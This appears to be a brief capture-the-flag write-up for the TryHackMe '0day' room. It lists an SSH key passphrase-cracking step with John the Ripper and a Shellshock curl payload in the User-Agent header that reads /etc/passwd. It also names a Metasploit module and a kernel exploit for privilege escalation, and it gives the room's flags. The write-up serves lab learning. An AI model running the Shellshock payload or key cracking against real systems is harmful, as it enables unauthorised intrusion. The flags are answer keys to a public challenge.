# 0day-cgi bin exploit&Kernel exploit

```
export IP=10.10.67.15
```

# Material needed

1. Interesting directory: /cgi-bin, /backup

2. Passphrase key: letmein

```
python ssh2john.py /root/Documents/TryHackMe_0day/id_rsa > id_rsa.hash
john --wordlist=/root/Documents/wordlist/rockyou.txt id_rsa.hash
john --show id_rsa.hash 
```

3. cgi-bin vulnerability check

```
nmap $IP -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$IP/cgi-bin/test.cgi 
``` 

4. Exploitdb

```
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

5. Privilege escalation

```
linux/local/37292.c
```
# Tasks

1. user.txt

```
THM{Sh3llSh0ck_r0ckz}
```

2. root.txt

```
THM{g00d_j0b_0day_is_Pleased}
```